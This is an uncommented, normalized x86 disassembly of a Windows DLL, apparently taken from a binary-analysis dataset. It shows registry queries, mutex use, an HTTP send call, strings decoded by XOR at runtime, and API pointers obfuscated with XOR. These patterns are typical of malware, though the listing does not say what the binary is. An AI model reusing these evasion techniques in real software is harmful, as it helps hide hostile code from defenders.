and [ ebp - 0x4 ] 0x0
push esi
call sub_1004713f
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1004759c
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_10079c35
retn
mov eax [ ebp - 0x1c ]
sub_100475b0
push ebp
mov ebp esp
sub esp 0x834
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
push edi
mov edi ecx
mov ecx [ eax + 0x110 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov eax [ edi + 0x4 ]
mov [ ebp - 0x82c ] 0x0
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x620 ]
push edx
call [ StrCpyW@IAT ]
mov esi [ edi + 0x8 ]
lea eax [ ebp - 0x82c ]
push eax
lea ebx [ ebp - 0x418 ]
call sub_1001cb30
add esp 0x4
test eax eax
je r-xdata
mov esi [ edi + 0xc ]
lea ecx [ ebp - 0x828 ]
push ecx
lea ebx [ ebp - 0x210 ]
call sub_1004b970
add esp 0x4
test eax eax
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov dl [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
mov edi [ edi ]
mov [ ebp - 0x830 ] dl
xor esi esi
xor edx edx
test edi edi
je r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push eax
mov eax [ ebp - 0x830 ]
push eax
mov eax [ ebp - 0x82c ]
lea ecx [ ebp - 0x210 ]
push ecx
push eax
lea ecx [ ebp - 0x418 ]
push ecx
lea eax [ ebp - 0x620 ]
push eax
lea ecx [ ebp - 0x828 ]
call sub_10002b50
test eax eax
jne r-xdata
mov edx edi
call sub_10031a30
mov ecx [ rw-data ]
mov edx [ ecx + 0x110 ]
push edx
call [ ReleaseMutex@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
lea esi [ eax + 0x8 ]
sub_100476f0
push ebp
mov ebp esp
sub esp 0x30c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfffc
and edx 0xff
mov [ ebp + eax * 2 - 0x44 ] dx
inc eax
cmp eax 0x19
jb r-xdata
push esi
mov esi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0x304 ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0x44 ]
push edx
push 0x80000002
mov [ ebp - 0x12 ] ax
call esi
test eax eax
jne r-xdata
push ebx
push edi
lea edx [ ebp - 0xa0 ]
mov eax 0x1f
call sub_100429d0
lea ecx [ ebp - 0x304 ]
push ecx
push 0x1
push 0x0
push edx
push 0x80000002
call esi
mov ebx [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x304 ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xf8 ]
mov eax 0x3
call sub_100429d0
lea ecx [ ebp - 0x304 ]
push ecx
push 0x1
push 0x0
push edx
push 0x80000002
call esi
test eax eax
jne r-xdata
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x300 ]
[ edi ]
lea edx [ ebp - 0x68 ]
mov eax 0x14
mov [ ebp - 0x308 ] 0x206
call sub_100429d0
lea eax [ ebp - 0x308 ]
push eax
mov eax [ ebp - 0x304 ]
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop ebx
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x300 ]
[ edi ]
lea edx [ ebp - 0x30c ]
mov eax 0x2b
mov [ ebp - 0x308 ] 0x206
call sub_100429d0
lea eax [ ebp - 0x308 ]
push eax
mov eax [ ebp - 0x304 ]
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call ebx
test eax eax
jne r-xdata
lea edx [ ebp - 0x300 ]
push edx
call [ CharUpperW@IAT ]
lea edx [ ebp - 0x10 ]
mov eax 0x2a
call sub_100429d0
mov eax edx
push eax
lea ecx [ ebp - 0x300 ]
push ecx
call sub_1005dcbd
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x304 ]
push ecx
jmp r-xdata
lea edx [ ebp - 0x300 ]
push edx
call [ CharUpperW@IAT ]
lea edx [ ebp - 0x10 ]
mov eax 0x23
call sub_100429d0
mov eax edx
push eax
lea ecx [ ebp - 0x300 ]
push ecx
call sub_1005dcbd
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp - 0x304 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
pop ebx
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x304 ]
push eax
call [ RegCloseKey@IAT ]
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x304 ]
push eax
sub_10047940
push ebp
mov ebp esp
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push ebx
xor ebx ebx
mov [ ebp - 0x220 ] eax
push esi
mov [ ebp - 0x218 ] ebx
xor eax eax
mov edi edi
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x3c
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x6
jb r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea edx [ ebp - 0x18 ]
xor eax eax
push edx
mov esi edi
mov [ ebp - 0xc ] ax
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x1d4 ]
mov eax 0x69
mov [ ebp - 0x214 ] ebx
call sub_100050e0
lea eax [ ebp - 0x214 ]
push eax
mov ecx edx
push ecx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x4c
call sub_100050e0
mov ebx 0x1
jmp r-xdata
lea edx [ ebp - 0x110 ]
mov eax 0x65
mov [ ebp - 0x1e0 ] ebx
call sub_100050e0
lea edx [ ebp - 0x1e0 ]
push edx
lea eax [ ebp - 0x110 ]
push eax
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x119
call sub_100050e0
mov ebx 0x2
jmp r-xdata
mov edx [ ebp - 0x218 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0x214 ]
push eax
call esi
mov ecx [ ebp - 0x1e0 ]
push ecx
call esi
mov edx [ ebp - 0x200 ]
push edx
call esi
mov eax [ ebp - 0x1e8 ]
push eax
call esi
mov ecx [ ebp - 0x210 ]
push ecx
call esi
mov edx [ ebp - 0x1f0 ]
push edx
call esi
mov eax [ ebp - 0x208 ]
push eax
call esi
mov ecx [ ebp - 0x1f8 ]
push ecx
call esi
mov edx [ ebp - 0x20c ]
push edx
call esi
mov eax [ ebp - 0x1dc ]
push eax
call esi
mov ecx [ ebp - 0x1e4 ]
push ecx
call esi
mov edx [ ebp - 0x1ec ]
push edx
call esi
mov eax [ ebp - 0x1f4 ]
push eax
call esi
mov ecx [ ebp - 0x1fc ]
push ecx
call esi
mov edx [ ebp - 0x204 ]
push edx
call esi
mov ecx [ ebp - 0x8 ]
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x160 ]
mov eax 0x8b
mov [ ebp - 0x200 ] ebx
call sub_100050e0
lea ecx [ ebp - 0x200 ]
push ecx
push edx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0xc3
call sub_100050e0
lea edx [ ebp - 0xd4 ]
mov eax 0x58
mov [ ebp - 0x1e8 ] ebx
call sub_100050e0
lea eax [ ebp - 0x1e8 ]
push eax
mov ecx edx
push ecx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0x114
call sub_100050e0
lea edx [ ebp - 0xe8 ]
mov eax 0x125
mov [ ebp - 0x210 ] ebx
call sub_100050e0
lea edx [ ebp - 0x210 ]
push edx
lea eax [ ebp - 0xe8 ]
push eax
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xb8
call sub_100050e0
lea edx [ ebp - 0x30 ]
mov eax 0x7
mov [ ebp - 0x1f0 ] ebx
call sub_100050e0
lea ecx [ ebp - 0x1f0 ]
push ecx
push edx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0xe
call sub_100050e0
mov ebx 0x4
jmp r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0xf6
mov [ ebp - 0x208 ] ebx
call sub_100050e0
lea eax [ ebp - 0x208 ]
push eax
mov ecx edx
push ecx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0xe5
call sub_100050e0
lea edx [ ebp - 0x138 ]
mov eax 0x1
mov [ ebp - 0x1f8 ] ebx
call sub_100050e0
lea edx [ ebp - 0x1f8 ]
push edx
lea eax [ ebp - 0x138 ]
push eax
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x89
call sub_100050e0
mov ebx 0x5
jmp r-xdata
lea edx [ ebp - 0x188 ]
mov eax 0x86
mov [ ebp - 0x1d8 ] ebx
call sub_100050e0
lea ecx [ ebp - 0x1d8 ]
push ecx
push edx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0x32
call sub_100050e0
mov ebx 0x6
jmp r-xdata
lea edx [ ebp - 0x174 ]
mov eax 0x103
mov [ ebp - 0x20c ] ebx
call sub_100050e0
lea eax [ ebp - 0x20c ]
push eax
mov ecx edx
push ecx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x1d8 ] r--data
lea edx [ ebp - 0x124 ]
mov eax 0x31
mov [ ebp - 0x1dc ] ebx
call sub_100050e0
lea edx [ ebp - 0x1dc ]
push edx
lea eax [ ebp - 0x124 ]
push eax
call sub_100283d0
lea edx [ ebp - 0xc4 ]
mov eax 0x24
mov [ ebp - 0x1e4 ] ebx
call sub_100050e0
lea ecx [ ebp - 0x1e4 ]
push ecx
push edx
call sub_100283d0
lea edx [ ebp - 0x1b8 ]
mov eax 0xd5
mov [ ebp - 0x1ec ] ebx
call sub_100050e0
lea eax [ ebp - 0x1ec ]
push eax
mov ecx edx
push ecx
call sub_100283d0
add esp 0x18
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0x39
call sub_100050e0
lea edx [ ebp - 0x14c ]
mov eax 0x63
mov [ ebp - 0x1f4 ] ebx
mov [ ebp - 0x204 ] ebx
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x1fc ] ebx
call sub_100050e0
lea edx [ ebp - 0x1f4 ]
push edx
lea eax [ ebp - 0x14c ]
push eax
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xb2
call sub_100050e0
lea edx [ ebp - 0x1a0 ]
mov eax 0xe9
call sub_100050e0
lea ecx [ ebp - 0x204 ]
push ecx
push edx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
mov eax 0x5b
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x91
call sub_100050e0
lea eax [ ebp - 0x21c ]
push eax
mov ecx edx
push ecx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x93
call sub_100050e0
lea edx [ ebp - 0x9c ]
call sub_100050e0
lea edx [ ebp - 0xfc ]
mov eax 0x8a
call sub_100050e0
lea edx [ ebp - 0x1fc ]
push edx
lea eax [ ebp - 0xfc ]
push eax
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x3
call sub_100050e0
xor eax eax
mov ecx [ ebp - 0x21c ]
mov edx [ ebp - 0x204 ]
push ecx
mov ecx [ ebp - 0x1fc ]
push edx
mov edx [ ebp - 0x1f4 ]
push ecx
mov ecx [ ebp - 0x1ec ]
push edx
mov edx [ ebp - 0x1e4 ]
push ecx
mov ecx [ ebp - 0x1dc ]
push edx
mov edx [ ebp - 0x1d8 ]
push ecx
mov ecx [ ebp - 0x20c ]
push edx
mov edx [ ebp - 0x1f8 ]
push ecx
mov ecx [ ebp - 0x208 ]
push edx
mov edx [ ebp - 0x1f0 ]
push ecx
mov ecx [ ebp - 0x210 ]
push edx
mov edx [ ebp - 0x1e8 ]
push ecx
mov ecx [ ebp - 0x214 ]
push edx
mov edx [ ebp - 0x218 ]
push ecx
mov ecx [ ebp - 0x1e0 ]
push edx
mov edx [ ebp - 0x200 ]
mov esi eax
call sub_10009be0
jmp r-xdata
push 0x58
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
mov eax 0xd9
lea edx [ ebp - 0x7c ]
mov eax 0x122
call sub_100050e0
mov ecx [ ebp - 0x220 ]
mov [ ecx ] eax
push edi
mov ecx eax
call sub_100418e0
test eax eax
je r-xdata
sub_10047f20
push ebp
mov ebp esp
sub esp 0x234
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x104
mov edi ecx
mov ecx [ edi + 0x4 ]
lea eax [ ebp - 0x228 ]
push eax
push ecx
mov [ ebp - 0x234 ] 0x0
call [ ExpandEnvironmentStringsW@IAT ]
mov edx [ rw-data ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
mov [ ebp - 0x22c ] edx
mov bl 0x38
xor [ ebp - 0x22c ] bl
xor [ ebp - 0x22b ] bl
xor [ ebp - 0x22a ] bl
xor [ ebp - 0x229 ] bl
push 0x80000000
lea eax [ ebp - 0x228 ]
push eax
call [ ebp - 0x22c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x0
push esi
call [ GetFileSize@IAT ]
mov [ ebp - 0x230 ] eax
push esi
cmp eax 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x22c ] edx
xor [ ebp - 0x22c ] bl
xor [ ebp - 0x22b ] bl
xor [ ebp - 0x22a ] bl
xor [ ebp - 0x229 ] bl
call [ ebp - 0x22c ]
cmp [ ebp - 0x230 ] 0x1e84800
jae r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x22c ] ecx
xor [ ebp - 0x22c ] bl
xor [ ebp - 0x22b ] bl
xor [ ebp - 0x22a ] bl
xor [ ebp - 0x229 ] bl
call [ ebp - 0x22c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x228 ]
push edx
mov ecx edi
call sub_10007df0
test eax eax
jne r-xdata
lea eax [ ebp - 0x230 ]
push eax
lea ecx [ ebp - 0x234 ]
push ecx
lea eax [ ebp - 0x228 ]
call sub_10015a50
add esp 0x8
test eax eax
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x125
call sub_10013830
mov ebx edx
lea edx [ ebp - 0x1c ]
mov eax 0x119
call sub_10013830
mov ebx edx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x125
call sub_10013830
mov ebx edx
call sub_1005c900
mov ecx [ ebp - 0x230 ]
mov esi [ ebp - 0x234 ]
xor edi edi
mov edx edi
call sub_1005d550
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x1c ]
mov eax 0x119
call sub_10013830
mov ebx edx
call sub_1005c900
mov ecx [ ebp - 0x230 ]
mov esi [ ebp - 0x234 ]
mov edx edi
call sub_1005d550
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
call sub_1005c900
sub_10048110
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi ecx
call sub_1000aa80
test eax eax
je r-xdata
mov ecx edi
call sub_100208f0
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x99
call sub_100050e0
mov eax 0x1
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx edi
call sub_100536c0
test eax eax
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x8e
call sub_100050e0
mov eax 0x2
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx edi
call sub_10035c10
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x9f
call sub_100050e0
mov esi edi
call sub_1001fae0
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x3c
call sub_100050e0
mov eax 0x4
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
call sub_10068530
test eax eax
jne r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0xc0
call sub_100050e0
mov eax 0x5
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x60 ]
mov eax 0x124
call sub_100050e0
mov eax 0x6
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
call sub_10061cc0
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10048240
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov [ edi ] edx
pop edi
pop esi
pop ebp
retn 0x8
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ edi + 0x4 ] edx
mov [ edi ] eax
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_100482d0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
push eax
push ecx
push edx
call [ lstrlenW@IAT ]
mov ecx [ esi ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ecx
call [ HttpSendRequestW@IAT ]
pop esi
test eax eax
jne r-xdata
mov eax 0x1
pop ebp
retn 0x8
push eax
call sub_10051250
add esp 0x4
xor eax eax
pop ebp
retn 0x8
sub_10048313
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_1007a540
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_1002ada5
mov [ eax ] edi
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10024145
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
jmp r-xdata
push esi
call sub_10031928
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_100202ee
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_10039c8c
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_1004fd6f
mov [ eax ] 0x1c
call sub_1002ada5
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_1005df26
pop ecx
jmp r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1002ada5
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_10012962
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_10053845
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_1004c0e8
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
